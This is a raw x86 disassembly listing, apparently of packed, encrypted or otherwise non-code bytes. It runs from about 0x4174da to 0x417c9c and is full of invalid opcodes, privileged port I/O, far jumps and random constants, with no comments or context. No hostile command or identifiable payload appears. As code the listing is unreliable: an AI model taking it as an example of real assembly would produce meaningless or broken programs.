  4174da:	int3   
  4174db:	loopne 0x4174f6
  4174dd:	sub    BYTE PTR [edx],cl
  4174df:	inc    ebp
  4174e0:	(bad)  
  4174e1:	xor    al,0xb0
  4174e3:	retf   
  4174e4:	add    ebp,DWORD PTR [ebp-0x41]
  4174e7:	fidiv  WORD PTR [esi+0x60]
  4174ea:	icebp  
  4174eb:	adc    esi,DWORD PTR [edi]
  4174ed:	cmp    al,0x1d
  4174ef:	adc    dh,BYTE PTR [esi+0x13ec2c99]
  4174f5:	out    0x86,eax
  4174f7:	out    dx,eax
  4174f8:	inc    ecx
  4174f9:	jne    0x41756a
  4174fb:	pop    esp
  4174fc:	and    cl,BYTE PTR [ecx]
  4174fe:	mov    BYTE PTR [edi-0x63],ah
  417501:	in     eax,0x15
  417503:	shr    bh,1
  417505:	sahf   
  417506:	xchg   DWORD PTR ds:0x4ea46858,ebx
  41750c:	mov    ds,WORD PTR ds:0xbd5f48e5
  417512:	push   edi
  417513:	fwait
  417514:	xchg   esi,eax
  417515:	sub    ebp,esi
  417517:	mov    ecx,0x7b453d1c
  41751c:	retf   
  41751d:	pop    ds
  41751e:	ror    BYTE PTR [ebp+0x47],1
  417521:	int3   
  417522:	push   esi
  417523:	out    dx,eax
  417524:	into   
  417525:	adc    esi,0x99692b2e
  41752b:	mov    ebp,0xdaf072b7
  417530:	imul   esi,DWORD PTR [edi-0x2939590a],0xea42906c
  41753a:	cdq    
  41753b:	popa   
  41753c:	and    eax,0x955f9e5c
  417541:	inc    ecx
  417542:	mov    bl,0x9b
  417544:	add    BYTE PTR [ebx],ah
  417546:	jb     0x417567
  417548:	hlt    
  417549:	push   cs
  41754a:	or     DWORD PTR [ebx+eax*8+0x1b],ebx
  41754e:	pop    ebx
  41754f:	sub    BYTE PTR [ebp+edx*2-0x721116f9],ah
  417556:	cdq    
  417557:	mov    WORD PTR [eax],es
  417559:	fiadd  DWORD PTR [edx-0x4252eaeb]
  41755f:	in     eax,dx
  417560:	cdq    
  417561:	pushf  
  417562:	clc    
  417563:	xchg   ecx,eax
  417564:	add    al,0xfe
  417566:	dec    edi
  417567:	nop
  417568:	call   DWORD PTR [edx]
  41756a:	jmp    0x46e4d2eb
  41756f:	mov    ch,0xae
  417571:	popa   
  417572:	push   ax
  417574:	pop    ss
  417575:	stos   BYTE PTR es:[edi],al
  417576:	scas   al,BYTE PTR es:[edi]
  417577:	xchg   BYTE PTR [ecx+0x4803ccf2],ch
  41757d:	jge    0x4175c9
  41757f:	cs inc ebx
  417581:	and    al,0x22
  417583:	pop    ds
  417584:	or     BYTE PTR [ebp+0x19],0xad
  417588:	into   
  417589:	mov    dl,ch
  41758b:	in     eax,0xde
  41758d:	mov    ds:0x8c628d6e,al
  417592:	inc    eax
  417593:	mov    ecx,0x88130b2
  417598:	lea    ecx,[esi+0x6f428191]
  41759e:	push   0x146d9698
  4175a3:	jo     0x4175a7
  4175a5:	jp     0x417621
  4175a7:	loop   0x41755d
  4175a9:	imul   ebp,eax,0xca350a46
  4175af:	clc    
  4175b0:	rcr    BYTE PTR [ebx-0x22],0xc5
  4175b4:	les    ebx,FWORD PTR [ecx]
  4175b6:	xchg   esi,eax
  4175b7:	push   ecx
  4175b8:	rol    DWORD PTR [ebp-0x3c1b7e09],cl
  4175be:	push   edx
  4175bf:	xchg   edx,eax
  4175c0:	sbb    BYTE PTR [ebp+0x6208eda6],al
  4175c6:	jns    0x4175f7
  4175c8:	push   ds
  4175c9:	xor    eax,0x9d6ac744
  4175ce:	add    eax,0x858ccb0d
  4175d3:	aad    0xa0
  4175d5:	mov    WORD PTR [ecx],fs
  4175d7:	jmp    0xecf23071
  4175dc:	rcr    DWORD PTR [edi+0x3f],0xd3
  4175e0:	test   esi,ebp
  4175e2:	add    BYTE PTR ds:0xef157e99,dh
  4175e8:	retf   0x6028
  4175eb:	mov    ds:0xcb8ac541,eax
  4175f0:	adc    BYTE PTR [ebp-0x40ffbf84],ch
  4175f6:	ror    BYTE PTR [ecx-0x9],1
  4175f9:	xor    ah,BYTE PTR ds:0x26c17709
  4175ff:	jns    0x4175ea
  417601:	bound  esp,QWORD PTR [ebp-0x3bd6794c]
  417607:	dec    edx
  417608:	and    eax,0x431d4556
  41760d:	gs ret 
  41760f:	fsub   QWORD PTR [esi]
  417611:	mov    ecx,DWORD PTR [ebx-0x67]
  417614:	dec    esi
  417615:	dec    esp
  417616:	push   0x2ef67264
  41761b:	or     al,bl
  41761d:	bound  ebx,QWORD PTR [ebx]
  41761f:	pushf  
  417620:	sub    DWORD PTR [ecx+ebx*8-0x656dd91],ebx
  417627:	and    ecx,ebp
  417629:	into   
  41762a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41762b:	sub    cl,BYTE PTR [ebp+0xbed7a70]
  417631:	lahf   
  417632:	push   es
  417633:	inc    ecx
  417634:	xor    ecx,DWORD PTR [ecx-0x13e9feca]
  41763a:	(bad)  
  41763b:	mov    al,ds:0x32204f76
  417640:	and    ebp,esi
  417642:	nop
  417643:	scas   eax,DWORD PTR es:[edi]
  417644:	jns    0x41766b
  417646:	shl    ah,1
  417648:	test   DWORD PTR [ecx],ebp
  41764a:	push   edi
  41764b:	xchg   BYTE PTR [ecx],ch
  41764d:	fs dec ebx
  41764f:	jp     0x417672
  417651:	rol    BYTE PTR [ebx+0x26c6cda],cl
  417657:	jno    0x4176b6
  417659:	loope  0x41767f
  41765b:	cmp    edx,DWORD PTR [ebp+0x27]
  41765e:	sub    DWORD PTR [eax],0x5d0cc840
  417664:	cmp    DWORD PTR [ebp-0x43],0x23df86c1
  41766b:	cmp    BYTE PTR [edi-0x5dcb41a6],0xe5
  417672:	out    dx,eax
  417673:	pop    eax
  417674:	xchg   edi,eax
  417675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417676:	scas   eax,DWORD PTR es:[edi]
  417677:	mov    esi,0x6cb15725
  41767c:	add    al,0xde
  41767e:	xlat   BYTE PTR ds:[ebx]
  41767f:	xor    eax,0x5d84bba0
  417684:	pop    edi
  417685:	jg     0x41765f
  417687:	cmp    eax,0x1d44230d
  41768c:	test   BYTE PTR [ebx],dh
  41768e:	dec    esp
  41768f:	cmp    BYTE PTR [ecx+eiz*4],ch
  417692:	add    BYTE PTR [eax+0x784d44f],dl
  417698:	inc    edx
  417699:	sbb    BYTE PTR gs:[edi+0x4cf5dc7f],dh
  4176a0:	mov    ds:0xdc6d93f3,eax
  4176a5:	iret   
  4176a6:	aaa    
  4176a7:	test   DWORD PTR [eax+eiz*2],edi
  4176aa:	iret   
  4176ab:	test   eax,0x1825dc81
  4176b0:	and    eax,0x5fad7d38
  4176b5:	scas   eax,DWORD PTR es:[edi]
  4176b6:	push   0x60
  4176b8:	cmc    
  4176b9:	jmp    0x2849:0xaf7de3f9
  4176c0:	xchg   ecx,eax
  4176c1:	(bad)  
  4176c2:	call   0x42e212b7
  4176c7:	mov    ecx,0xfc22f678
  4176cc:	jmp    0x4176be
  4176ce:	add    al,0x83
  4176d0:	mov    bh,BYTE PTR [ebx+esi*1+0x73]
  4176d4:	pop    ebx
  4176d5:	sub    BYTE PTR [eax-0x5f501ee1],ah
  4176db:	mov    cs,WORD PTR [ebp+0xf4c368f]
  4176e1:	dec    edi
  4176e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176e3:	shr    DWORD PTR [edx+0x5a],cl
  4176e6:	jge    0x4176d8
  4176e8:	adc    eax,0x97cb63d4
  4176ed:	or     eax,0x8717e287
  4176f2:	inc    esi
  4176f3:	cmp    BYTE PTR [eax+esi*4],0x4a
  4176f7:	mov    ch,0xa7
  4176f9:	mov    ah,0x86
  4176fb:	mov    bl,0x6c
  4176fd:	out    dx,al
  4176fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ff:	addr16 (bad) 
  417701:	cld    
  417702:	sbb    bh,BYTE PTR [ebp+0x548986e3]
  417708:	or     BYTE PTR [eax+0x3dc3dbf7],dl
  41770e:	dec    ebx
  41770f:	adc    DWORD PTR [eax],esp
  417711:	dec    esp
  417712:	retf   
  417713:	scas   al,BYTE PTR es:[edi]
  417714:	fild   DWORD PTR [edx]
  417716:	and    DWORD PTR [edx-0x50019b3d],esi
  41771c:	sbb    DWORD PTR [esi+0x5e75dd7e],0x2a
  417723:	add    eax,0x92650ca7
  417728:	(bad)  
  417729:	les    esi,FWORD PTR [eax+0xee1e496]
  41772f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417730:	jno    0x417701
  417732:	sub    DWORD PTR [ebx+eax*1],0x4e
  417736:	and    dl,BYTE PTR [esi+ebx*8-0x4842a349]
  41773d:	lahf   
  41773e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41773f:	jle    0x41778b
  417741:	loope  0x417766
  417743:	cld    
  417744:	test   DWORD PTR [edi+0x3ccb72da],ebx
  41774a:	(bad)  
  41774b:	xor    al,0x17
  41774d:	inc    esi
  41774e:	je     0x417745
  417750:	sub    ebp,esp
  417752:	sub    al,ch
  417754:	and    eax,0xb22cafb0
  417759:	push   ebp
  41775a:	jne    0x41774f
  41775c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775d:	test   BYTE PTR [ebp-0x741d6f7a],0xf1
  417764:	test   al,0xb2
  417766:	retf   0xf7ec
  417769:	aad    0x4f
  41776b:	adc    eax,eax
  41776d:	jle    0x41770e
  41776f:	inc    ecx
  417770:	fldcw  WORD PTR [ebx-0x58]
  417773:	xor    DWORD PTR [esi+eax*2-0x58],ecx
  417777:	cmp    BYTE PTR [esi+0x66dd8a54],dh
  41777d:	adc    al,0xb4
  41777f:	jmp    0x955b:0x441d809a
  417786:	sbb    DWORD PTR [ecx+0xc4af3be],edx
  41778c:	lods   al,BYTE PTR ds:[esi]
  41778d:	xchg   ecx,eax
  41778e:	iret   
  41778f:	jg     0x417770
  417791:	das    
  417792:	inc    eax
  417793:	fcom   st(1)
  417795:	sub    eax,0xaa7431b8
  41779a:	jp     0x4177af
  41779c:	or     eax,0x3c9d964e
  4177a1:	jnp    0x41772f
  4177a3:	or     BYTE PTR [edx-0x9],0x13
  4177a7:	mov    ebp,0x5b9ff841
  4177ac:	mov    ebp,DWORD PTR [edx]
  4177ae:	icebp  
  4177af:	cmc    
  4177b0:	cmp    eax,0x18268784
  4177b5:	push   edx
  4177b6:	sbb    eax,0xb06a3735
  4177bb:	lds    eax,FWORD PTR [edx]
  4177bd:	push   ebx
  4177be:	pushf  
  4177bf:	fisubr DWORD PTR [ecx]
  4177c1:	mov    edx,0x460fba94
  4177c6:	jg     0x41781e
  4177c8:	les    esp,FWORD PTR [edi-0x21b0366a]
  4177ce:	stc    
  4177cf:	mov    ecx,0xc49fbe87
  4177d4:	cmp    esi,edi
  4177d6:	sub    ecx,DWORD PTR [ecx]
  4177d8:	clc    
  4177d9:	rcr    ch,1
  4177db:	popa   
  4177dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177dd:	adc    edx,edi
  4177df:	push   edi
  4177e0:	idiv   bh
  4177e2:	xlat   BYTE PTR ds:[ebx]
  4177e3:	push   ecx
  4177e4:	fidiv  DWORD PTR [ecx+0x4d9929e2]
  4177ea:	idiv   eax
  4177ec:	dec    esi
  4177ed:	adc    BYTE PTR [ecx],bh
  4177ef:	adc    eax,0x1fc7fdba
  4177f4:	mov    ds:0xae5280d4,eax
  4177f9:	sub    BYTE PTR [eax],0xae
  4177fc:	stos   DWORD PTR es:[edi],eax
  4177fd:	mov    gs,WORD PTR [ebx]
  4177ff:	jmp    0x2610:0x7ee5c35
  417806:	inc    esp
  417807:	dec    edx
  417808:	sbb    eax,DWORD PTR [eax]
  41780a:	xchg   edi,eax
  41780b:	pop    ebp
  41780c:	mov    dh,0x80
  41780e:	sbb    ch,BYTE PTR [ecx+edi*4]
  417811:	ins    DWORD PTR es:[edi],dx
  417812:	mov    ah,0xdb
  417814:	cwde   
  417815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417816:	cld    
  417817:	xor    BYTE PTR [ecx],bh
  417819:	test   al,0x88
  41781b:	adc    eax,esp
  41781d:	(bad)  
  41781e:	outs   dx,DWORD PTR ds:[esi]
  41781f:	fcom   DWORD PTR [eax-0x31]
  417822:	outs   dx,DWORD PTR ds:[esi]
  417823:	or     DWORD PTR ds:0x855eeda7,0xa116cc89
  41782d:	outs   dx,BYTE PTR ds:[esi]
  41782e:	repnz jmp 0xe2c:0x92d95acc
  417836:	xor    eax,DWORD PTR [ebx-0x79a53a37]
  41783c:	mov    eax,ds:0x142d46c6
  417841:	jne    0x41781a
  417843:	pop    eax
  417844:	cmp    DWORD PTR [ebx],ebx
  417846:	(bad)  
  417847:	out    dx,al
  417848:	sti    
  417849:	pop    ebx
  41784a:	stos   DWORD PTR es:[edi],eax
  41784b:	push   edx
  41784c:	adc    al,0xa5
  41784e:	rcl    BYTE PTR [edx-0x7f],1
  417851:	int3   
  417852:	dec    ebp
  417853:	test   cl,bh
  417855:	ror    DWORD PTR [edx],cl
  417857:	ins    DWORD PTR es:[edi],dx
  417858:	push   cs
  417859:	loop   0x4178b3
  41785b:	add    BYTE PTR [eax+0x8],dl
  41785e:	imul   edi,ebp,0x4d
  417861:	mov    ds:0x8383eeb4,eax
  417866:	jb     0x4178a8
  417868:	pop    esi
  417869:	retf   
  41786a:	stos   BYTE PTR es:[edi],al
  41786b:	sub    DWORD PTR [edx+0x105e67c8],ebp
  417871:	pop    ecx
  417872:	mov    eax,0xf77a06e2
  417877:	sbb    BYTE PTR [edx-0x7dc773d2],0xcc
  41787e:	sbb    al,0x41
  417880:	sbb    DWORD PTR [esi+0x35971e12],edi
  417886:	lods   al,BYTE PTR ds:[esi]
  417887:	sub    edx,esp
  417889:	pop    esp
  41788a:	or     eax,0x7b8144c1
  41788f:	mov    bh,0xc0
  417891:	lds    ebx,FWORD PTR [ebp+0x279f1f60]
  417897:	mov    ch,0x8b
  417899:	(bad)  
  41789a:	push   ds
  41789b:	dec    esi
  41789c:	mov    bh,0x2d
  41789e:	sbb    DWORD PTR [eax+0x30],ebp
  4178a1:	add    dl,bh
  4178a3:	mov    ch,0x24
  4178a5:	jmp    0x1709:0xcbefb24a
  4178ac:	popf   
  4178ad:	jmp    DWORD PTR [edi]
  4178af:	mov    ?,edi
  4178b1:	inc    esp
  4178b2:	mov    DWORD PTR [edx],esp
  4178b4:	sbb    eax,0x6e7d88b
  4178b9:	(bad)  
  4178ba:	mov    dl,0xa1
  4178bc:	mov    eax,0xbbfed315
  4178c1:	loope  0x41791e
  4178c3:	mov    WORD PTR [ebx-0x6c7ba823],ds
  4178c9:	lea    eax,[esi+0x24]
  4178cc:	lahf   
  4178cd:	enter  0x2766,0x8c
  4178d1:	adc    esp,esi
  4178d3:	push   ecx
  4178d4:	popf   
  4178d5:	punpcklwd mm4,mm3
  4178d8:	xchg   ecx,eax
  4178d9:	loop   0x417959
  4178db:	adc    ch,BYTE PTR [ebx+ebp*8]
  4178de:	rol    BYTE PTR [edx-0x6f],0xbe
  4178e2:	adc    ebp,edi
  4178e4:	mov    eax,ds:0xaf5ac892
  4178e9:	push   cs
  4178ea:	pushf  
  4178eb:	pop    esi
  4178ec:	push   es
  4178ed:	jae    0x41792f
  4178ef:	adc    DWORD PTR [ecx+0x5ec15f5e],0xffffffc3
  4178f6:	mov    ah,BYTE PTR [eax-0x47]
  4178f9:	xor    al,0x3d
  4178fb:	test   al,0x54
  4178fd:	push   ebp
  4178fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ff:	lods   al,BYTE PTR ds:[esi]
  417900:	into   
  417901:	std    
  417902:	outs   dx,DWORD PTR ds:[esi]
  417903:	stos   DWORD PTR es:[edi],eax
  417904:	call   0x86fb1b81
  417909:	ins    BYTE PTR es:[edi],dx
  41790a:	xchg   ecx,eax
  41790b:	jnp    0x417940
  41790d:	xor    al,bh
  41790f:	push   0xffffffc6
  417911:	xchg   esi,eax
  417912:	loopne 0x417979
  417914:	cmp    ebp,eax
  417916:	loop   0x4178a3
  417918:	adc    DWORD PTR ds:[edx-0x1f],eax
  41791c:	and    eax,0x6b12772f
  417921:	xor    al,0x78
  417923:	mov    ebx,0x8f36ffa8
  417928:	and    DWORD PTR [ecx-0x213d2c11],eax
  41792e:	fdiv   st(2),st
  417930:	sti    
  417931:	ins    BYTE PTR es:[edi],dx
  417932:	out    0x6e,al
  417934:	mov    bh,0xc8
  417936:	sbb    DWORD PTR [ebx],esi
  417938:	jns    0x417916
  41793a:	ins    BYTE PTR es:[edi],dx
  41793b:	hlt    
  41793c:	inc    esi
  41793d:	std    
  41793e:	mov    ds:0xfaff37e9,al
  417943:	pop    DWORD PTR [ecx]
  417945:	lahf   
  417946:	xor    eax,0x658105f8
  41794b:	jns    0x417962
  41794d:	xchg   edi,eax
  41794e:	call   0x8203254f
  417953:	in     al,dx
  417954:	loope  0x41798b
  417956:	jge    0x417946
  417958:	and    ecx,ebx
  41795a:	pop    edi
  41795b:	(bad)  [edi-0x15024e84]
  417961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417962:	xor    BYTE PTR [esi],ch
  417964:	xor    BYTE PTR [ebx+0x36],0x8c
  417968:	dec    ebp
  417969:	nop
  41796a:	mov    eax,ds:0x4dd7997c
  41796f:	inc    edi
  417970:	mov    edi,0x988f1549
  417975:	mov    ?,WORD PTR [edx]
  417977:	or     edi,DWORD PTR [edx]
  417979:	push   ebp
  41797a:	inc    edi
  41797b:	mov    bh,0x8a
  41797d:	dec    esi
  41797e:	imul   edi,DWORD PTR [eax-0x19],0xcba9c34
  417985:	clc    
  417986:	sub    bh,BYTE PTR [eax-0x10721d36]
  41798c:	jnp    0x4179e2
  41798e:	or     eax,0x715f4dfe
  417993:	mov    eax,0x6e7d55cc
  417998:	mov    ebx,0x2e342ce4
  41799d:	pop    edx
  41799e:	xor    BYTE PTR [edi-0xf],0xd6
  4179a2:	inc    edx
  4179a3:	mov    edi,0xeaeefa91
  4179a8:	mov    al,BYTE PTR [ebp+esi*8+0x16]
  4179ac:	cmp    al,0xcf
  4179ae:	ror    DWORD PTR [eax],1
  4179b0:	mov    ds:0xffc897f8,eax
  4179b5:	(bad)  
  4179b6:	jl     0x417a30
  4179b8:	enter  0x76d1,0xcc
  4179bc:	loope  0x41797a
  4179be:	jns    0x4179ee
  4179c0:	pop    ecx
  4179c1:	lods   eax,DWORD PTR ds:[esi]
  4179c2:	cmp    DWORD PTR [edi-0x7bc915fe],edx
  4179c8:	unpckhps xmm1,xmm3
  4179cb:	adc    DWORD PTR [esi-0x64618438],ecx
  4179d1:	lea    ebx,[ecx+ecx*2+0x1c]
  4179d5:	mov    edi,esi
  4179d7:	popa   
  4179d8:	xor    al,0xc5
  4179da:	pop    eax
  4179db:	rcl    BYTE PTR [esi+0x701bda62],cl
  4179e1:	(bad)  
  4179e2:	ror    BYTE PTR [edi-0x76],0xe
  4179e6:	cmp    al,BYTE PTR [eax-0x6a]
  4179e9:	xor    al,0x1e
  4179eb:	mov    ebp,0xee361cc3
  4179f0:	imul   ebx,ecx,0xfffffff8
  4179f3:	push   edx
  4179f4:	fistp  DWORD PTR [esi-0x58]
  4179f7:	shr    DWORD PTR [edx+0x7c],0x51
  4179fb:	sub    al,0x7a
  4179fd:	mov    al,0xb6
  4179ff:	lahf   
  417a00:	ret    
  417a01:	jecxz  0x4179af
  417a03:	mov    dl,0xe0
  417a05:	stos   DWORD PTR es:[edi],eax
  417a06:	jg     0x417a44
  417a08:	fsubr  DWORD PTR [ebp-0x22]
  417a0b:	shr    DWORD PTR [ecx+eax*8-0x6e7d8864],0xaa
  417a13:	sti    
  417a14:	bound  edx,QWORD PTR [edx]
  417a16:	push   edx
  417a17:	(bad)  
  417a19:	adc    eax,0x4ebf568c
  417a1e:	js     0x417a19
  417a20:	in     al,0xee
  417a22:	loopne 0x4179fb
  417a24:	daa    
  417a25:	mov    al,ds:0x35202956
  417a2a:	pushf  
  417a2b:	mov    cl,0x82
  417a2d:	mov    ah,BYTE PTR [ebx+eiz*4+0x4d]
  417a31:	pop    ds
  417a32:	and    al,0xab
  417a34:	fidiv  WORD PTR [ebx+0x48]
  417a37:	std    
  417a38:	sti    
  417a39:	das    
  417a3a:	xor    eax,0xc40bf964
  417a3f:	push   ds
  417a40:	jns    0x417a82
  417a42:	imul   esp,ebp,0xad660806
  417a48:	or     BYTE PTR [ecx+edx*2-0x87a651d],bl
  417a4f:	push   edi
  417a50:	inc    ebx
  417a51:	mov    WORD PTR [edx+0x29],ss
  417a54:	popf   
  417a55:	ins    BYTE PTR es:[edi],dx
  417a56:	xor    BYTE PTR [esi-0x6ed1f571],ch
  417a5c:	lods   al,BYTE PTR ds:[esi]
  417a5d:	push   ebx
  417a5e:	test   DWORD PTR [esi+0x72855fda],esp
  417a64:	jae    0x4179fe
  417a66:	lods   eax,DWORD PTR ds:[esi]
  417a67:	push   es
  417a68:	shl    BYTE PTR [eax],cl
  417a6a:	push   es
  417a6b:	jmp    0x988b:0x776c2762
  417a72:	dec    ebp
  417a73:	xchg   edx,eax
  417a74:	jbe    0x417abd
  417a76:	jecxz  0x417ad4
  417a78:	imul   edx,DWORD PTR [edi-0x382bd1f0],0xc42e3533
  417a82:	fdivr  QWORD PTR [eax-0x2b]
  417a85:	fs aas 
  417a87:	mov    edx,0x94a1bf79
  417a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8d:	cwde   
  417a8e:	adc    al,0xba
  417a90:	out    dx,eax
  417a91:	add    esp,eax
  417a93:	adc    BYTE PTR [ebp-0x58],ah
  417a96:	push   esi
  417a97:	sar    edx,cl
  417a99:	inc    esp
  417a9a:	pop    edx
  417a9b:	inc    ecx
  417a9c:	ins    DWORD PTR es:[edi],dx
  417a9d:	dec    edi
  417a9e:	inc    ecx
  417a9f:	call   DWORD PTR [edi]
  417aa1:	inc    esi
  417aa2:	jae    0x417aa0
  417aa4:	aas    
  417aa5:	xor    eax,0xe9fb9fed
  417aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aab:	mov    ch,0xc
  417aad:	xor    DWORD PTR [edi],esi
  417aaf:	cwde   
  417ab0:	cmp    al,0x3b
  417ab2:	sub    ebx,ecx
  417ab4:	xor    ebp,DWORD PTR [ebx+0x44ef26eb]
  417aba:	xchg   esi,eax
  417abb:	lods   al,BYTE PTR ds:[esi]
  417abc:	xchg   ebp,eax
  417abd:	mov    DWORD PTR [ecx-0x22f29871],esi
  417ac3:	outs   dx,BYTE PTR ds:[esi]
  417ac4:	imul   eax,ecx,0xffffffe1
  417ac7:	frstor [ecx+0x45]
  417aca:	test   BYTE PTR [eax-0x71],cl
  417acd:	dec    ecx
  417ace:	fisubr WORD PTR [esi-0x74c0a1b7]
  417ad4:	or     BYTE PTR [edx+0x45],0xe1
  417ad8:	add    edx,DWORD PTR [esi+0x5ba3dd6d]
  417ade:	mov    eax,ds:0xb3560cd
  417ae3:	xchg   bh,al
  417ae5:	or     BYTE PTR [ebx-0x7f258863],ch
  417aeb:	das    
  417aec:	clc    
  417aed:	(bad)  
  417aee:	sub    dl,BYTE PTR [edi]
  417af0:	jns    0x417b49
  417af2:	call   0xd77fe791
  417af7:	or     DWORD PTR [esi-0x59a4f826],eax
  417afd:	dec    ebp
  417afe:	jl     0x417b24
  417b00:	sbb    DWORD PTR [ebx-0x78],0x789d2df3
  417b07:	add    al,al
  417b09:	xchg   ebp,eax
  417b0a:	push   edx
  417b0b:	jl     0x417b80
  417b0d:	push   edx
  417b0e:	int3   
  417b0f:	mov    ebx,0x6cada090
  417b14:	push   edi
  417b15:	mov    BYTE PTR [ebx+0x788e799e],bl
  417b1b:	mov    eax,0x4eda6351
  417b20:	and    dh,BYTE PTR ds:0xcbf63267
  417b26:	rol    DWORD PTR [esi],0x9
  417b29:	jno    0x417ba9
  417b2b:	loope  0x417b95
  417b2d:	out    dx,al
  417b2e:	mov    ds:0x3a8fec64,al
  417b33:	xchg   ebx,eax
  417b34:	ror    DWORD PTR [ecx+esi*2+0xf],cl
  417b38:	pop    ebp
  417b39:	(bad)  [esi-0x5f]
  417b3c:	mov    dl,0x5d
  417b3e:	or     esp,DWORD PTR ds:0x44257963
  417b44:	call   DWORD PTR [ecx+0x182c842c]
  417b4a:	inc    esi
  417b4b:	xor    DWORD PTR [eax+0x36],ebx
  417b4e:	mov    BYTE PTR [ebx-0x456c02a5],dh
  417b54:	outs   dx,BYTE PTR ds:[esi]
  417b55:	jl     0x417bcb
  417b57:	scas   al,BYTE PTR es:[edi]
  417b58:	clc    
  417b59:	cmp    esi,esi
  417b5b:	fsub   DWORD PTR [ecx]
  417b5d:	sbb    DWORD PTR [edx],esp
  417b5f:	dec    ebx
  417b60:	in     eax,dx
  417b61:	push   esi
  417b62:	mov    cl,0x7f
  417b64:	js     0x417b59
  417b66:	outs   dx,DWORD PTR ds:[esi]
  417b67:	cwde   
  417b68:	push   eax
  417b69:	jbe    0x417be6
  417b6b:	adc    DWORD PTR [edi-0x68],ebx
  417b6e:	add    esp,DWORD PTR [edi-0x1d]
  417b71:	mov    eax,ds:0x80918f35
  417b76:	loop   0x417bc1
  417b78:	dec    esp
  417b79:	aas    
  417b7a:	xchg   edi,eax
  417b7b:	and    DWORD PTR [ebx],esp
  417b7d:	lods   al,BYTE PTR ds:[esi]
  417b7e:	or     eax,0xb5d0a5bf
  417b83:	aaa    
  417b84:	adc    al,0x3f
  417b86:	cs cmp al,0x65
  417b89:	mov    al,0xe3
  417b8b:	adc    DWORD PTR [ebx+0x13fc1e45],eax
  417b91:	push   esi
  417b92:	test   DWORD PTR [esi+0x65f8e07e],esi
  417b98:	loop   0x417bf6
  417b9a:	out    0x72,al
  417b9c:	inc    edx
  417b9d:	gs jge 0x417b27
  417ba0:	clc    
  417ba1:	lea    esp,[ecx+edi*8-0x49e2a2cd]
  417ba8:	add    al,0xcd
  417baa:	test   BYTE PTR [eax+0x63],0x18
  417bae:	xchg   BYTE PTR [edi+0x17],al
  417bb1:	mov    edi,0x8a7342eb
  417bb6:	cmp    BYTE PTR [edi+ebx*8],0x47
  417bba:	sub    ebx,DWORD PTR [ebx+0x78]
  417bbd:	retf   0xc6d0
  417bc0:	pop    ebp
  417bc2:	jmp    0xa290488e
  417bc7:	int    0x72
  417bc9:	or     BYTE PTR [edx-0x5b610b90],al
  417bcf:	jb     0x417bbf
  417bd1:	sbb    BYTE PTR [esi-0x7cf1e449],ah
  417bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd8:	or     al,0x1a
  417bda:	and    ecx,DWORD PTR [edx+0x29]
  417bdd:	popf   
  417bde:	push   es
  417bdf:	xor    al,0x9d
  417be1:	pop    edx
  417be2:	enter  0x2329,0xe0
  417be6:	icebp  
  417be7:	sbb    BYTE PTR [ebx-0x79a0e437],al
  417bed:	int3   
  417bee:	lods   al,BYTE PTR ds:[esi]
  417bef:	and    eax,0x92993cb4
  417bf4:	(bad)
  417bf7:	cli    
  417bf8:	push   edx
  417bf9:	mov    DWORD PTR [edx-0x6bb0e3cc],ebx
  417bff:	lds    esi,FWORD PTR [edi-0x5f2e6777]
  417c05:	jo     0x17044a00
  417c0b:	(bad)  
  417c0c:	(bad)  
  417c0e:	mov    esp,0x16af397d
  417c13:	mov    esi,0xc0784329
  417c18:	cmp    BYTE PTR [esi],cl
  417c1a:	addr16 cli 
  417c1c:	in     eax,0x0
  417c1e:	les    eax,FWORD PTR [edi]
  417c20:	pop    edx
  417c21:	sbb    cl,bl
  417c23:	lock ret 0x21af
  417c27:	pop    ecx
  417c28:	lods   eax,DWORD PTR ds:[esi]
  417c29:	jmp    0xf37:0xee39c127
  417c30:	add    al,0xf
  417c32:	push   esi
  417c33:	adc    BYTE PTR [edx-0x645d975],0x1e
  417c3a:	push   ds
  417c3b:	ins    BYTE PTR es:[edi],dx
  417c3c:	in     eax,dx
  417c3d:	leave  
  417c3e:	sbb    BYTE PTR [ebx-0x14],0xe3
  417c42:	cdq    
  417c43:	mov    gs,WORD PTR [ecx]
  417c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c46:	int    0x1a
  417c48:	sub    ebx,DWORD PTR [esi+0x79]
  417c4b:	adc    bl,dh
  417c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4e:	sub    ebx,esi
  417c50:	les    ebp,FWORD PTR [edx+0x42578d47]
  417c56:	push   0x6a
  417c58:	mov    esi,0xd3fdbfd1
  417c5d:	jb     0x417c2a
  417c5f:	pop    esp
  417c60:	arpl   WORD PTR [eax],cx
  417c62:	in     eax,dx
  417c63:	push   esi
  417c64:	push   edx
  417c65:	jno    0x417ca7
  417c67:	out    0x61,al
  417c69:	inc    ecx
  417c6a:	call   ecx
  417c6c:	mov    edi,0xcc284862
  417c71:	test   DWORD PTR [edx+0x21113093],esi
  417c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c78:	sub    esi,DWORD PTR [eax]
  417c7a:	mov    DWORD PTR [ebp-0x6f],eax
  417c7d:	xor    ch,BYTE PTR ds:0x34fcdcd6
  417c83:	stos   BYTE PTR es:[edi],al
  417c84:	test   BYTE PTR [edx],0x2c
  417c87:	and    BYTE PTR [eax+0x333be30b],dl
  417c8d:	pop    edx
  417c8e:	imul   eax,DWORD PTR [edx+0x59],0xffffffb0
  417c92:	scas   eax,DWORD PTR es:[edi]
  417c93:	xor    ecx,edx
  417c95:	xchg   edx,eax
  417c96:	inc    esp
  417c97:	lods   al,BYTE PTR ds:[esi]
  417c98:	pop    ss
  417c99:	test   al,0xb8
  417c9b:	push   es
  417c9c:	push   es
